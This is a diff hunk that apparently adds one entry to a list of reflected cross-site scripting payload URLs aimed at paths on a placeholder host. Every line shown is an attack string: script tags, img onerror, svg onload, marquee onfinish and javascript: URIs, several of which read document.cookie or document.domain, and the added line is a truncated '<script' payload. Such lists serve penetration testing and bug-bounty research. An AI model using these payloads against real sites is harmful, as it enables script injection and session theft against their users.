@@ -455,6 +455,7 @@ https://target.com/mk/api/send-event?rid=%3C/script%3E%3Cscript%3Ealert(document
 https://target.com/musicstore?section=%27-alert(document.domain
 https://target.com/my_reports/api/v1/document%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie
 https://target.com/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1
+https://target.com/nin/success?message=lol&nin=<script
 https://target.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
 https://target.com/partners/apex/Cloud_chat?endpoint=javascript:alert(document.domain
 https://target.com/php/fb_login_pass_reset?type=%22%3E%3Csvg/onload=alert%28document.domain%29%3E%3Ch1%3EBoooooya!!%3C/h1%3E
